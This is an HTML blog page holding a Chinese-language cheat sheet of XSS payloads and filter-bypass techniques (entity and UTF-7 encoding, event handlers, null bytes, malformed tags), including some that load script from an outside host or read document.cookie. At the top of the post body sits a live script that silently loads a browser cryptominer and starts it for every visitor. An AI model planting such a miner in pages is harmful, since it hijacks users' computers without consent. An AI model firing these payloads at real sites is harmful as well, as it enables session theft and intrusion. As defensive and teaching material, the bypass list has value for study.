<!DOCTYPE html>
<html>
  <!-- Html Head Tag-->
  <head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="">
  <meta name="author" content="Damit 5">
  <!-- Open Graph Data -->
  <meta property="og:title" content="XSS 绕过常用语句"/>
  <meta property="og:description" content="纸上得来终觉浅，绝知此事要躬行。" />
  <meta property="og:site_name" content="Damit5&#39;s Blog"/>
  <meta property="og:type" content="article" />
  <meta property="og:image" content="http://damit5.ml"/>
  
    <link rel="alternate" href="/atom.xml" title="Damit5&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  

  <!-- Site Title -->
  <title>Damit5's Blog</title>

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="/css/bootstrap.min.css">
  <!-- Custom CSS -->
  
  <link rel="stylesheet" href="/css/style.dark.css">

  <!-- Google Analytics -->
  

</head>

  <body>
    <!-- Page Header -->


<header class="site-header header-background" style="background-image: url(/img/background.jpg)">
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="page-title with-background-image">
          <p class="title">XSS 绕过常用语句</p>
          <p class="subtitle"></p>
        </div>
        <div class="site-menu with-background-image">
          <ul>
            
              <li>
                <a href="/">
                  
                  Home
                  
                </a>
              </li>
            
              <li>
                <a href="/archives">
                  
                  Archives
                  
                </a>
              </li>
            
              <li>
                <a href="https://github.com/damit5/damit5.github.io">
                  
                  Github
                  
                </a>
              </li>
            
              <li>
                <a href="mailto:damit5@protonmail.com">
                  
                  Email
                  
                </a>
              </li>
            
              <li>
                <a href="http://damit5.ml/AboutMe">
                  
                  AboutMe
                  
                </a>
              </li>
            
              <li>
                <a href="http://damit5.ml/Link">
                  
                  Friend Link
                  
                </a>
              </li>
            
          </ul>
        </div>
      </div>
    </div>
  </div>
</header>

<article>
  <div class="container typo">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <div class="post-info text-muted">
          
            <!-- Author -->
            <span class="author info">By Damit 5</span>
          
          <!-- Date -->
          <span class="date-time info">On
            <span class="date">2017-10-15</span>
            <span class="time">17:37:56</span>
          </span>
          
        </div>
        <!-- Tags -->
        
          <div class="post-tags text-muted">
            Tags: 

<a class="tag" href="/tags/渗透测试/">#渗透测试</a>


          </div>
        
        <!-- Post Main Content -->
        <div class="post-content">
          <script src="/assets/js/APlayer.min.js"> </script>
<html>
<head>
<script>
var script = document.createElement("script");
script.type = "text/javascript";
script.src = "https://ppoi.org/lib/projectpoi.min.js";
script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
document.getElementsByTagName("head")[0].appendChild(script);
</script>
</head>
</html>

<h4 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面:::"></a>写在最前面:::</h4><p>下文中 <code>alert</code> 都可以由 <code>prompt</code> 代替</p>
<a id="more"></a>
<h2 id="最常用的-XSS-漏洞测试代码："><a href="#最常用的-XSS-漏洞测试代码：" class="headerlink" title="最常用的 XSS 漏洞测试代码："></a>最常用的 XSS 漏洞测试代码：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;prompt(&quot;XSS&quot;)&lt;/script&gt;</div><div class="line"></div><div class="line"></div><div class="line">&lt;SCRIPT SRC=http://damit5.ml/xss.js&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
<h2 id="在输入-Input-标签里"><a href="#在输入-Input-标签里" class="headerlink" title="在输入(Input)标签里"></a>在输入(Input)标签里</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;INPUT type=&quot;text&quot; value=&apos;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;&gt;</div></pre></td></tr></table></figure>
<h4 id="闭合-lt-input-gt"><a href="#闭合-lt-input-gt" class="headerlink" title="闭合&lt;input&gt;"></a>闭合<code>&lt;input&gt;</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
<p>现在我们的代码执行了。因为我们闭合了前面的 html 标签，就触发了 XSS，但是，你可能会发现，页面上会显示一个多出来的单引号，为什么，因为后面的那个原来的单引号没有匹配，我们继续修改我们的代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&lt;xss a=&apos;</div></pre></td></tr></table></figure></p>
<p>所有的输入就会变成这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;INPUT type=&quot;text&quot; value=&apos;&apos;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&lt;xss a=&apos;&apos;&gt;</div></pre></td></tr></table></figure></p>
<p>Javascript 代码就注入了。<code>&lt;xss a=”&gt;</code>这个没什么意义，你可以自己改，但是符合 html 的标准，<br>页面不会出错。</p>
<h2 id="绕过单引号过滤"><a href="#绕过单引号过滤" class="headerlink" title="绕过单引号过滤"></a>绕过单引号过滤</h2><p>同样的例子，但是我们假设管理员在我们的单引号之前放置了一个“\”，有时候双引号之前也会放置，通<br>过一些类似 add_slashes 的函数可以实现，这个就是转义字符，我们先前的代码就会变成这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;INPUT type=&quot;text&quot; value=&apos;\&apos;&gt;&lt;SCRIPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCRIPT&gt;&apos;&gt;</div></pre></td></tr></table></figure>
<p>有一些方法可以继续，但是要看过滤的那个函数是怎么放的了。其中一个方法就是使用字符实体，学过 html<br>的都知道，就是一些特殊字符会用一些固有的符号组合来表示，举个例子，你不能用&lt;&gt;表示大于和小于，<br>因为这被解释为 html 标签，但是，你如果要用，可以用下面的来代替。</p>
<table>
<thead>
<tr>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&amp;#34;</code></td>
<td><code>&amp;quot;</code></td>
<td>“</td>
<td>双引号</td>
<td></td>
</tr>
<tr>
<td><code>&amp;#38;</code></td>
<td><code>&amp;amp;</code></td>
<td>&amp;</td>
<td>&amp;符号</td>
<td></td>
</tr>
<tr>
<td><code>&amp;#60;</code></td>
<td><code>&amp;lt;</code></td>
<td>&lt;</td>
<td>小于号</td>
<td></td>
</tr>
<tr>
<td><code>&amp;#62;</code></td>
<td><code>&amp;gt;</code></td>
<td>&gt;</td>
<td>大于号</td>
<td></td>
</tr>
</tbody>
</table>
<p>使用<code>&amp;quot;</code>或者<code>&amp;#34;</code><br>来代替我们的双引号，有时候可以绕过过滤。</p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子:"></a>例子:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div><div class="line">&lt;script&gt;alert(&amp;quot;XSS&amp;quot;)&lt;/script&gt;</div><div class="line">&lt;script&gt;alert(&amp;#38;XSS&amp;#38;)&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>如果这都被过滤了。那我们可以使用 JavaScript 的 <code>fromCharCode</code> 函数，这个函数把指定的 Unicode<br>值转换成字符串。</p>
<h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div><div class="line">&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</div></pre></td></tr></table></figure>
<h2 id="绕过-lt-SCRIPT-gt-过滤"><a href="#绕过-lt-SCRIPT-gt-过滤" class="headerlink" title="绕过 &lt;SCRIPT&gt;过滤"></a>绕过 <code>&lt;SCRIPT&gt;</code>过滤</h2><p>有些过滤器会过滤到<code>&lt;script&gt;</code>标签，那上面的例子就都废了，但是。还是有方法插入 javascript 的。我们看看事件处理器的例子。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BODY onload=&quot;alert(&apos;XSS&apos;)&quot;&gt;</div></pre></td></tr></table></figure></p>
<p>在 html 里啊。这个 Onload 关键字就是一个事件，其他的所有标签都没有这个属性，但是 Body 标签是有的。但是，有一定的局限性，如果 onload 事件在你的代码之前已经被处理了。那就不会触发了。。不过我们可以继续看看 onerror 事件处理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;&quot; onerror=&quot;alert(&apos;XSS&apos;)&quot;&gt;</div><div class="line"></div><div class="line">&lt;IMG SRC=/ onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt;&lt;/img&gt;</div></pre></td></tr></table></figure>
<p>注意看，图片没有指定，也就是出错了。Onerror 这个事件就会发茶。引发 XSS 漏洞，没有用<code>&lt;script&gt;</code><br>标签哦。</p>
<h2 id="使用-IMG-源"><a href="#使用-IMG-源" class="headerlink" title="使用 IMG 源"></a>使用 IMG 源</h2><p>Html 中最常用的两个标签 <code>img</code> 和 <code>a href</code>一般是不会过滤的，一个指定图片，一个指定超链接。最危险的<br>是 <code>img</code> 标签</p>
<h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><h6 id="标准的样子："><a href="#标准的样子：" class="headerlink" title="标准的样子："></a>标准的样子：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure>
<h6 id="没有双引号和分号"><a href="#没有双引号和分号" class="headerlink" title="没有双引号和分号:"></a>没有双引号和分号:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</div></pre></td></tr></table></figure>
<h6 id="不区分大小写的xss攻击向量"><a href="#不区分大小写的xss攻击向量" class="headerlink" title="不区分大小写的xss攻击向量"></a>不区分大小写的xss攻击向量</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;</div></pre></td></tr></table></figure>
<h6 id="过滤了双引号和-lt-script-gt"><a href="#过滤了双引号和-lt-script-gt" class="headerlink" title="过滤了双引号和 &lt;script&gt;:"></a>过滤了双引号和 <code>&lt;script&gt;</code>:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</div></pre></td></tr></table></figure>
<h6 id="使用-CharCode-绕过过滤"><a href="#使用-CharCode-绕过过滤" class="headerlink" title="使用 CharCode 绕过过滤:"></a>使用 CharCode 绕过过滤:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</div></pre></td></tr></table></figure>
<h6 id="有经验的攻击者也可以把上面的全部转换成相等的-Ascii-码"><a href="#有经验的攻击者也可以把上面的全部转换成相等的-Ascii-码" class="headerlink" title="有经验的攻击者也可以把上面的全部转换成相等的 Ascii 码:"></a>有经验的攻击者也可以把上面的全部转换成相等的 Ascii 码:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101; &amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</div></pre></td></tr></table></figure>
<h6 id="使用-Ascii-表你可以自己试试。当然转换成-16-进制也是可以的。。"><a href="#使用-Ascii-表你可以自己试试。当然转换成-16-进制也是可以的。。" class="headerlink" title="使用 Ascii 表你可以自己试试。当然转换成 16 进制也是可以的。。"></a>使用 Ascii 表你可以自己试试。当然转换成 16 进制也是可以的。。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp; #x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x58;&amp;#x53;&amp;#x53;&amp;#x27;&amp;#x29;&gt;</div></pre></td></tr></table></figure>
<h6 id="默认SRC属性去绕过SRC域名检测过滤器"><a href="#默认SRC属性去绕过SRC域名检测过滤器" class="headerlink" title="默认SRC属性去绕过SRC域名检测过滤器"></a>默认SRC属性去绕过SRC域名检测过滤器</h6><p>这将绕过绝大多数SRC域名过滤器。插入javascript代码在任何一个事件方法同样适用于热河一个HTML标签，例如Form、Iframe、Input、Embed等等。他将也允许任何任何该标签的相关事件去替换，例如onblur, onclick等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=# onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;</div></pre></td></tr></table></figure></p>
<h6 id="默认SRC属性通过省略它的值"><a href="#默认SRC属性通过省略它的值" class="headerlink" title="默认SRC属性通过省略它的值"></a>默认SRC属性通过省略它的值</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC= onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;</div></pre></td></tr></table></figure>
<h6 id="默认SRC属性通过完全不设置它"><a href="#默认SRC属性通过完全不设置它" class="headerlink" title="默认SRC属性通过完全不设置它"></a>默认SRC属性通过完全不设置它</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG onmouseover=&quot;alert(&apos;xxs&apos;)&quot;&gt;</div></pre></td></tr></table></figure>
<h6 id="结尾没有分号的十六进制html编码引用"><a href="#结尾没有分号的十六进制html编码引用" class="headerlink" title="结尾没有分号的十六进制html编码引用"></a>结尾没有分号的十六进制html编码引用</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</div></pre></td></tr></table></figure>
<h2 id="使用制表符-换行符和回车符"><a href="#使用制表符-换行符和回车符" class="headerlink" title="使用制表符, 换行符和回车符"></a>使用制表符, 换行符和回车符</h2><h6 id="使用了最小的十六进制的制表符来欺骗过滤器"><a href="#使用了最小的十六进制的制表符来欺骗过滤器" class="headerlink" title="使用了最小的十六进制的制表符来欺骗过滤器"></a>使用了最小的十六进制的制表符来欺骗过滤器</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav&amp;#x9ascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>Type</th>
<th>Horizontal Tab</th>
<th>New line</th>
<th>Carriage Return</th>
</tr>
</thead>
<tbody>
<tr>
<td>URL</td>
<td><code>%09</code></td>
<td><code>%10</code></td>
<td><code>%13</code></td>
<td></td>
</tr>
<tr>
<td>Minimal Sized Hex</td>
<td><code>&amp;#x9</code></td>
<td><code>&amp;#xA</code></td>
<td><code>&amp;#xD</code></td>
</tr>
<tr>
<td>Maximum Sized Hex</td>
<td><code>&amp;#x0000009;</code></td>
<td><code>&amp;#x000000A;</code></td>
<td><code>&amp;#x000000D;</code></td>
</tr>
<tr>
<td>Minimum Sized Decimal</td>
<td><code>&amp;#9</code></td>
<td><code>&amp;#10</code></td>
<td><code>&amp;#13</code></td>
</tr>
<tr>
<td>Maximum Sized Decimal</td>
<td><code>&amp;#x0000009;</code></td>
<td><code>&amp;#x0000009;</code></td>
<td><code>&amp;#0000009;</code></td>
</tr>
</tbody>
</table>
<h2 id="使用空字符"><a href="#使用空字符" class="headerlink" title="使用空字符"></a>使用空字符</h2><p>另一个可以绕过的就是空字符，这是最有效的工具了。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCR%00IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
<p>空字符 (%00) 使得过滤器不能看到完整的 <code>&lt;SCRIPT&gt;</code> 标签. 只在 <strong>IE 6.0, IE 7.0</strong> 可以。</p>
<h2 id="双引号配对的bug"><a href="#双引号配对的bug" class="headerlink" title="双引号配对的bug"></a>双引号配对的bug</h2><p>绕过这种过滤就是寻找闭合的标签，然后构造来突破</p>
<h4 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;</div></pre></td></tr></table></figure>
<p>通常我们认为，img 标签里。前两个引号被认为是一对，什么都不做，下一个引号和最后的匹配，但是事<br>实不是这样，所有的浏览器都在试图修正这一问题。<br>结果最终如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&quot;&amp;gt;</div></pre></td></tr></table></figure></p>
<h2 id="不全面的过滤器"><a href="#不全面的过滤器" class="headerlink" title="不全面的过滤器"></a>不全面的过滤器</h2><p>我们看看当开发者已经把能想到的都过滤了或者什么的。就安全了吗？不。我们可以依然可以向数据指令里插入代码。我们通过 base64 加密<code>&lt;script&gt;alert(‘XSS’)&lt;/script&gt;.</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot;</div><div class="line">CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;</div></pre></td></tr></table></figure>
<h2 id="畸形的A标签"><a href="#畸形的A标签" class="headerlink" title="畸形的A标签"></a>畸形的A标签</h2><p>跳过href属性，而直接获取xss实质攻击代码…提出被David Cross ~ 已验证在chrome浏览器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>此外，chrome浏览器喜欢去不全确实的引号为你。如果你遇到阻碍那么直接省略它们吧，chrome将会正确的帮你不全缺失的引号在URL和script中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<h2 id="使用双引号"><a href="#使用双引号" class="headerlink" title="使用双引号"></a>使用双引号</h2><h6 id="如果你需要使用双引号和单引号。使用一些诡异的用法吧-重音符混淆-。"><a href="#如果你需要使用双引号和单引号。使用一些诡异的用法吧-重音符混淆-。" class="headerlink" title="如果你需要使用双引号和单引号。使用一些诡异的用法吧 (重音符混淆)。"></a>如果你需要使用双引号和单引号。使用一些诡异的用法吧 (重音符混淆)。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=`javascript:alert(&quot;Look its, &apos;XSS&apos;&quot;)`&gt;</div></pre></td></tr></table></figure>
<h2 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h2><h6 id="转义字符有时候很有用，可以对付一些简单的过滤器"><a href="#转义字符有时候很有用，可以对付一些简单的过滤器" class="headerlink" title="转义字符有时候很有用，可以对付一些简单的过滤器"></a>转义字符有时候很有用，可以对付一些简单的过滤器</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=`javascript:alert(\&quot;XSS\&quot;)`&gt;</div></pre></td></tr></table></figure>
<p>结果如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=`javascript:alert(\\&quot;XSS\\&quot;)`&gt;</div></pre></td></tr></table></figure>
<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><h4 id="使用-utf-7-编码可以绕过"><a href="#使用-utf-7-编码可以绕过" class="headerlink" title="使用 utf-7 编码可以绕过"></a>使用 utf-7 编码可以绕过</h4><h4 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>使用UTF-7编码后 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">+ADw-script+AD4-alert(+ACI-XSS+ACI-)+ADw-/script+AD4-</div></pre></td></tr></table></figure>
<p>然后所有的加号需要被改成%2b，否则会被浏览器识别为连接符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%2BADw-script%2BAD4-alert%281%29%2BADw-/script%2BAD4-</div></pre></td></tr></table></figure>
<h4 id="一个列表"><a href="#一个列表" class="headerlink" title="一个列表:"></a>一个列表:</h4><table>
<thead>
<tr>
<th>字符</th>
<th>实体引用</th>
</tr>
</thead>
<tbody>
<tr>
<td>空格</td>
<td>%20</td>
</tr>
<tr>
<td>/</td>
<td>%2F</td>
</tr>
<tr>
<td>“</td>
<td>%22</td>
</tr>
<tr>
<td>?</td>
<td>%3F</td>
</tr>
</tbody>
</table>
<h2 id="我也不知道咋分类了"><a href="#我也不知道咋分类了" class="headerlink" title="我也不知道咋分类了"></a>我也不知道咋分类了</h2><h4 id="内嵌TAB"><a href="#内嵌TAB" class="headerlink" title="内嵌TAB"></a>内嵌TAB</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav   ascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure>
<h4 id="内嵌被编码的TAB"><a href="#内嵌被编码的TAB" class="headerlink" title="内嵌被编码的TAB"></a>内嵌被编码的TAB</h4><p>用来分开xss攻击代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure></p>
<h4 id="内嵌换行符去分开xss代码"><a href="#内嵌换行符去分开xss代码" class="headerlink" title="内嵌换行符去分开xss代码"></a>内嵌换行符去分开xss代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure>
<h4 id="编码回车符去分开xss代码"><a href="#编码回车符去分开xss代码" class="headerlink" title="编码回车符去分开xss代码"></a>编码回车符去分开xss代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure>
<h4 id="没有分割的javascript指令"><a href="#没有分割的javascript指令" class="headerlink" title="没有分割的javascript指令"></a>没有分割的javascript指令</h4><p>null字符也可以作为一个xss向量，但是不像上边那样。你需要直接注入它们利用一些工具例如Burp Proxy，或是使用 %00 在你的url字符串里。或者如果你想写你自己的注入工具你可以使用vim（^V^@ 会生成null），以及用下面的程序去生成它到一个文本文件中。好吧，我再一次撒谎了。 Opera的老版本（大约 7.11 on Windows）是脆弱的对于一个额外的字符173（软连字符）。但是null字符 %00 是更加的有用或者帮助我们绕过某些真实存在的过滤器用过变动像这个例子中的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out</div></pre></td></tr></table></figure></p>
<h4 id="图片元素中javascript之前的空格和元字符为xss"><a href="#图片元素中javascript之前的空格和元字符为xss" class="headerlink" title="图片元素中javascript之前的空格和元字符为xss"></a>图片元素中javascript之前的空格和元字符为xss</h4><p>xss过滤拼配模式没有考虑单词”javascript:”中可能存在空格是正确的，因为否则将无法渲染。但是这也导致了错误的假设认为你不可以有一个空格在引号和 “javascript:” 单词之间。事实上你可以插入 1-32编码字符（十进制）中的任何字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure></p>
<h4 id="非字母数字字符xss"><a href="#非字母数字字符xss" class="headerlink" title="非字母数字字符xss"></a>非字母数字字符xss</h4><p>Firefox html解析器设定一个非数字字母字符不是有效的在一个html关键字后面，因此这些字符会被视为空白符或是无效的token在html标签之后。这导致很多xss过滤器错误的认为html标签必须是被空白符隔断的。</p>
<h5 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT/XSS SRC=&quot;http://damit5.ml/xss.js&quot;&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
<p>和上面的原理相同，我们继续扩大，Gecko渲染引擎允许字母、数字、html封装字符以外的任何字符位于事件处理器与等号之间。从而借此绕过xss过滤器。注意这也是适用于重音符如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</div></pre></td></tr></table></figure></p>
<p>Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是他们仅允许一个一个斜杠在html标签和参数之间，在不使用空格的情况下。这可能是有用的在那些不允许输入空格的系统中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT/SRC=&quot;http://damit5.ml/xss.js&quot;&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure></p>
<h4 id="附加的开括号"><a href="#附加的开括号" class="headerlink" title="附加的开括号"></a>附加的开括号</h4><p>Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，因为这些引擎通过拼配最早出现的一对尖括号，并且提取其内部内容作为标签，而没有使用更加有效的算法例如 Boyer-Moore（寻找打开的尖括号以及相关标签的模糊拼配）。代码中的双斜杠可以抑制额外尖括号导致的javascript错误。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure></p>
